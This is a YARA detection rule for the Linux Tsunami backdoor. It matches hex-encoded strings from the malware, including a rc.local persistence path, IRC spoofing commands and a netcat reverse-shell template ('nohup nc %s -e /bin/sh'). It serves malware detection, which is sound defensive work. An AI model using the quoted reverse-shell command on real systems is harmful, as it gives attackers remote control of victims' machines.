
rule Backdoor_Linux_Tsunami_SB_xp{
	meta:
		description = "Backdoor:Linux/Tsunami.SB!xp,SIGNATURE_TYPE_ELFHSTR_EXT,08 00 08 00 05 00 00 02 00 "
		
	strings :
		$a_01_0 = {2f 65 74 63 2f 72 63 2e 64 2f 72 63 2e 6c 6f 63 61 6c } //02 00  /etc/rc.d/rc.local
		$a_01_1 = {47 45 54 53 50 4f 4f 46 53 } //02 00  GETSPOOFS
		$a_01_2 = {73 68 20 2d 63 20 27 6e 6f 68 75 70 20 6e 63 20 25 73 20 2d 65 20 2f 62 69 6e 2f 73 68 20 27 } //02 00  sh -c 'nohup nc %s -e /bin/sh '
		$a_01_3 = {44 6f 20 73 6f 6d 65 74 68 69 6e 67 20 6c 69 6b 65 3a 20 31 36 39 2e 34 30 } //02 00  Do something like: 169.40
		$a_01_4 = {4e 4f 54 49 43 45 20 25 73 20 3a 52 65 6d 6f 76 65 64 20 61 6c 6c 20 73 70 6f 6f 66 73 } //00 00  NOTICE %s :Removed all spoofs
	condition:
		any of ($a_*)
 
}